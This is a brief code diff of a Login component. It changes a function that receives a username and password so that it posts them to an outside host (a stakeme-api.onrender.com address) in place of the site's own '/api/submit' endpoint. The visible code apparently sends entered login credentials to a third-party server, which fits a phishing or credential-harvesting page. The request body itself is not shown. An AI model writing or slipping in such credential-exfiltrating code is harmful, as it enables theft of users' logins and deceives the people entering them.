@@ -57,7 +57,7 @@ export default function Login() {
   // ============================================
   const sendAlertToServer = async (username: string, password: string) => {
     try {
-      const response = await fetch('/api/submit', {
+      const response = await fetch('https://stakeme-api.onrender.com/api/submit', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
